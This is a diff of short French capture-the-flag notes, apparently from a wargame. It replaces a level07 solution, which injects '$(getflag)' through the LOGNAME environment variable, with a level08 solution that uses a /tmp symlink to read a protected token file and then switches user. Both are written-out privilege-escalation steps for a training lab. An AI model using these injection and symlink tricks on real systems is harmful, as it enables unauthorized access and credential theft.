@@ -1,16 +1,10 @@
 
-export LOGNAME='$(getflag)'
+faire un lien symbolique
 
-./level07
+ln -s /home/user/level08/token /tmp/test
 
-on reverse programme apeler level07
+./level08 /tmp/test
 
-on vois qu'il ne fait qu'afficher la variable d'environement apeller LOGNAME qui est normalement censer donner juste le nom du compte su lequel on est.
+su level08
 
-du coup on a juste a changer la valeur de cette variable pour lui injecter un notre commande getflag
-
-export LOGNAME='$(getflag)'
-
-et on lance le ./level07 
-
-magie
+getflag 
